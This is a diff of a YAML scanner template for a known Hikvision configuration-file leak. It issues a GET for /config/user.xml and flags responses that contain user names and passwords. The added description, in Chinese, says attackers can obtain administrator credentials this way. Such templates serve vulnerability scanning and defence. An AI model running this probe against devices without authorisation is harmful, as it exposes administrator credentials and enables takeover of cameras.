@@ -1,18 +1,21 @@
 id: hikvision-info-leak
 
 info:
-    name: hikvision-info-leak
-    author: tangshoupu
-    severity: high
-    verified: false
-    reference:
-        - https://www.seebug.org/vuldb/ssvid-91762
+  name: hikvision 配置文件泄露
+  author: tangshoupu
+  severity: high
+  verified: false
+  description: |-
+    hikvision 存在目录浏览漏洞，攻击者可以通过访问/config/user.xml来获取hikvision设备的管理员账号密码等信息。
+  reference:
+    - https://www.seebug.org/vuldb/ssvid-91762
+  tags: hikvision,disclosure
+  created: 2023/10/29
 
 rules:
-    r0:
-        request:
-            method: GET
-            path: /config/user.xml
-        expression: response.status == 200 && response.body.bcontains(b'<user name=') && response.body.bcontains(b'password="')
+  r0:
+    request:
+      method: GET
+      path: /config/user.xml
+    expression: response.status == 200 && response.body.bcontains(b'<user name=') && response.body.bcontains(b'password="')
 expression: r0()
-
